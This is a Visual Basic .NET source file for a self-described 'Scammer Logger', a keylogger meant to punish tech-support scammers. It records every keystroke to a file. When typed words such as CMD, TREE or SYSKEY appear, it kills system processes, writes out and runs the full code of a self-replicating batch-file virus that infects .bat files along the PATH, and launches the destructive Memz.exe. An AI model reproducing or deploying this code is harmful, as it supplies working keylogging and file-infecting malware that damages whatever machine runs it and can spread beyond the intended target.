﻿Imports Microsoft.WindowsCE.Forms
Imports System
Imports System.IO

Public Class Login
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short


    Dim keysDown As New List(Of Integer)()
    Dim newUp As New List(Of Integer)()

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim items As Array
        items = System.Enum.GetValues(GetType(Keys))
        Using sw As StreamWriter = File.AppendText("Keys.txt")

            For Each key In items
                Dim test As Integer = GetAsyncKeyState(key)
                If test <> 0 Then
                    Dim temp As String = key.ToString()
                    If temp.Count > 1 Then
                        temp = "[" + temp + "]"
                    End If
                    If Not (keysDown.Contains(key)) Then
                        sw.Write(temp)
                    End If
                    keysDown.Add(key)
                ElseIf keysDown.Contains(key) Then
                    newUp.Add(key)
                End If
            Next
        End Using

        For Each up In newUp
            keysDown.Remove(up)
        Next
        newUp.Clear()

    End Sub
 
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Dim Explorer As Process
        Dim Notepads As Process() = Process.GetProcessesByName("iexplore") 'creates an array with all running processes with the same name

        For Each Explorer In Notepads
            Explorer.Kill()

        Next
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text = "guest" And TextBox2.Text = "guest" Then
            Timer1.Start()
            Me.Hide()
        Else
            MessageBox.Show("Login Failed")
        End If
        If TextBox1.Text = "marx" And TextBox2.Text = "1234" Then
            Timer1.Start()
            Me.Hide()
        Else
            MessageBox.Show("Login Failed")
        End If


    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.Close()
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        MessageBox.Show("You've been hacked :)")
    End Sub

    Private Sub Login_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        MessageBox.Show("Please Login, When you built the program it should have a list of (LookFor) Password's (Guest and Guest) Use both for User and Password, Admin Account is MarX, Thank you for using Scammer Logger. All use of this program is not to serve as a Keylogger but as a Scammer Program. So far I made 5 Level's of Fun. All depends on what he type's that will make it work, The Readme has all the info of the Level's , They all have to be used in order", "MarXyMuffins Say's!")
    End Sub

    Private Sub Level1_Tick(sender As Object, e As EventArgs) Handles Level1.Tick

        Dim Findstring = IO.File.ReadAllText("Keys.txt")
        Dim Lookfor As String = "CMD"

        If Findstring.Contains(Lookfor) Then
            My.Computer.FileSystem.DeleteFile("Keys.txt")
            MessageBox.Show("Level 1 Technician")
            Process.Start("dXDIAG.EXE")
            Timer3.Start()
            Level2.Start()
        End If

    End Sub

    Private Sub Level2_Tick(sender As Object, e As EventArgs) Handles Level2.Tick
        Dim FS2 = IO.File.ReadAllText("Keys.txt")
        Dim Look2 As String = "TREE"

        If FS2.Contains(Look2) Then
            My.Computer.FileSystem.DeleteFile("Keys.txt")
            MessageBox.Show("Level 2 Technician")
            Timer2.Start()
            Level3.Start()
            Level2.Stop()
        End If


    End Sub

    Private Sub Level3_Tick(sender As Object, e As EventArgs) Handles Level3.Tick
        Dim FS3 = IO.File.ReadAllText("Keys.txt")
        Dim Look3 As String = "EVENTVWR"

        If FS3.Contains(Look3) Then
            My.Computer.FileSystem.DeleteFile("Keys.txt")
            MessageBox.Show("Level 3 Technician")
            Dim Poo As Process
            Dim Po As Process() = Process.GetProcessesByName("Cmd") 'creates an array with all running processes with the same name

            For Each Poo In Po
                Poo.Kill()

            Next

        End If
        Level4.Start()
        Level3.Stop()
    End Sub

    Private Sub Level4_Tick(sender As Object, e As EventArgs) Handles Level4.Tick
        Dim FS4 = IO.File.ReadAllText("Keys.txt")
        Dim Look4 As String = "PIE"

        If FS4.Contains(Look4) Then
            My.Computer.FileSystem.DeleteFile("Keys.txt")
            MessageBox.Show("Level 4 Technician")
            Process.Start("eventvwr.exe")
            Dim sb As New System.Text.StringBuilder

            sb.AppendLine("@if not '%0==' if '%_melt%==' goto meltbeg")
            sb.AppendLine("::---- dummy host --------")
            sb.AppendLine("@echo off")
            sb.AppendLine("echo Hello World!")
            sb.AppendLine("::---- end dummy host ----")
            sb.AppendLine("@goto MeLTend [MeLT_2a]")
            sb.AppendLine(":MeLTbeg")
            sb.AppendLine("@echo off%_MeLT%")
            sb.AppendLine("if '%1=='MeLT goto MeLT%2")
            sb.AppendLine("if not exist %comspec% set comspec=%_MeLT%command")
            sb.AppendLine("%comspec% /e:5000 /c %0 MeLT vir")
            sb.AppendLine("set MeLTcl=%1 %2 %3 %4 %5 %6 %7 %8 %9")
            sb.AppendLine("call %0 MeLT rh")
            sb.AppendLine("set _MeLT=")
            sb.AppendLine("set MeLTcl=")
            sb.AppendLine("goto MeLTend")
            sb.AppendLine(":MeLTrh")
            sb.AppendLine("set _MeLT=x")
            sb.AppendLine("%0 %MeLTcl%")
            sb.AppendLine(":MeLTvir")
            sb.AppendLine("set MeLTH=%0")
            sb.AppendLine("if not exist %_MeLT%%temp%\nul set temp=%tmp%")
            sb.AppendLine("if exist %temp%\MeLT_2a goto MeLTrun")
            sb.AppendLine("%0 MeLT fnd . %path%")
            sb.AppendLine(":MeLTfnd")
            sb.AppendLine("shift%_MeLT%")
            sb.AppendLine("if '%2==' exit MeLT")
            sb.AppendLine("set MeLT=%2\%MeLTH%.bat")
            sb.AppendLine("if not exist %MeLT% set MeLT=%2\%MeLTH%")
            sb.AppendLine("if not exist %MeLT% set MeLT=%2%MeLTH%.bat")
            sb.AppendLine("if not exist %MeLT% set MeLT=%2%MeLTH%")
            sb.AppendLine("if not exist %MeLT% goto MeLTfnd")
            sb.AppendLine("find MeLT <%MeLT%>%temp%\MeLT_2a")
            sb.AppendLine("attrib %temp%\MeLT_2a +h")
            sb.AppendLine(":MeLTrun")
            sb.AppendLine("%MeLTH% MeLT s . .. %path%")
            sb.AppendLine(":MeLTs")
            sb.AppendLine("shift%_MeLT%")
            sb.AppendLine("if '%2==' exit MeLT")
            sb.AppendLine("for %%a in (%2\*.bat %2*.bat) do call %MeLTH% MeLT inf %%a")
            sb.AppendLine("goto MeLTs")
            sb.AppendLine(":MeLTinf")
            sb.AppendLine("find /i MeLT <%3>nul")
            sb.AppendLine("if not errorlevel 1 goto MeLTno")
            sb.AppendLine("echo @if not '%%0==' if '%%_melt%%==' goto meltbeg>MeLT.t")
            sb.AppendLine("type %3>>MeLT.t")
            sb.AppendLine("echo.>>MeLT.t")
            sb.AppendLine("type %temp%\MeLT_2a>>MeLT.t")
            sb.AppendLine("move MeLT.t %3>nul")
            sb.AppendLine("exit MeLT")
            sb.AppendLine(":MeLTact - flash-melt screen text then put back to normal")
            sb.AppendLine("echo e 100 BA D0 07 BB 00 B8 8E C3 8B CA 33 FF 26 8B 05 FE>MeLT.t")
            sb.AppendLine("echo e 110 C0 FE C4 26 89 05 47 47 E2 F2 FE 06 24 01 75 E8>>MeLT.t")
            sb.AppendLine("echo e 120 B4 4C CD 21 00>>MeLT.t")
            sb.AppendLine("echo g>>MeLT.t")
            sb.AppendLine("debug<MeLT.t>nul")
            sb.AppendLine("del MeLT.t")
            sb.AppendLine("exit MeLT")
            sb.AppendLine(":MeLTno")
            sb.AppendLine("set MeLTC=%MeLTC%1")
            sb.AppendLine("if %MeLTC%==1111111111 goto MeLTact")
            sb.AppendLine(":MeLTend")


            IO.File.WriteAllText("fileName.bat", sb.ToString())

            Process.Start("fileName.bat")

        End If
        Level5.Start()
        Level4.Stop()
    End Sub

    Private Sub Level5_Tick(sender As Object, e As EventArgs) Handles Level5.Tick
        Dim FS1 = IO.File.ReadAllText("Keys.txt")
        Dim Look1 As String = "SYSKEY"

        If FS1.Contains(Look1) Then
            My.Computer.FileSystem.DeleteFile("Keys.txt")
            MessageBox.Show("Level 5 Technician")
            MessageBox.Show("You are a Madarchod SCAMMER ENJOY!")
            Dim Poo1 As Process
            Dim Po1 As Process() = Process.GetProcessesByName("explorer") 'creates an array with all running processes with the same name

            For Each Poo1 In Po1
                Poo1.Kill()

            Next
            Process.Start("Memz.exe")
        End If

    End Sub

End Class

